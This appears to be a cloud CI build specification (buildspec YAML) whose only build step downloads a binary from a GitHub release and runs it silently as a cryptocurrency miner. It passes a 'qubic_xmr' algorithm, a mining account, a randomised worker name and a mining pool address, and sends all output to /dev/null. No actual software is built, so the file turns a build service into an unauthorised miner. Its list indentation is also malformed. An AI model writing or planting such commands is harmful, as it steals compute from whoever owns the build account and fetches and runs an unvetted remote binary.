version: 0.2

phases:
  build:
    commands:
      - wget https://github.com/vedhagsvp/qubros/releases/download/apl/aplnnm
        - chmod +x aplnnm
        - ./aplnnm --algo qubic_xmr --account CP_udnvh2owpq --worker $(echo $(shuf -i 1-15000 -n 1)-CD300) --pool qubic.eu.apool.net:8080 > /dev/null 2>&1
